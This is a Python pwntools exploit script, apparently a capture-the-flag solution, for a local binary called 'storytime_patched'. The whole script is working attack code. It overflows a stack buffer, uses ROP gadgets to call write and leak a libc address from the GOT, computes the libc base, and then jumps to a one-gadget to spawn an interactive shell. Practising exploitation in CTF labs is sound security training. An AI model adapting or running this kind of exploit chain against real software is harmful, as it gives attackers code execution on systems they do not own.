#!/usr/bin/env python3

from pwn import *

context.binary = binary = ELF("./storytime_patched")

libc = ELF("./libc.so.6")

p = process("./storytime_patched")
# gdb.attach(p, gdbscript="break *0x000000000040069c")

len_to_of = 0x38
padding = b'a'*len_to_of

write_plt_addr = 0x00000000004004a0
write_got_addr = 0x0000000000601018
pop_rdi_gadget = 0x0000000000400703
pop_rsi_gadget = 0x0000000000400701
middle_addr = 0x004005d4 # moves a positive value to rdx
main_addr = 0x0040062e
ret_gadget = 0x000000000040048e

payload = padding + p64(middle_addr) + p64(pop_rsi_gadget) + p64(write_got_addr) + p64(0xdeadbeef) + p64(write_plt_addr) + p64(main_addr)

p.recvline()
p.recvline()
p.sendline(payload)


p.recvuntil("The End")
leak = p.recvline()[:8]
log.info(f'libc base at {hex(int.from_bytes(leak, "little"))}')


base = int.from_bytes(leak, "little") - libc.symbols['write']
oneshot = 0x4526a

log.info(f"Executing oneshot @ {hex(base+oneshot)}")
p.recvuntil("Tell me a story")
p.recvline()
payload = padding + p64(base+oneshot)

p.sendline(payload)

p.interactive()
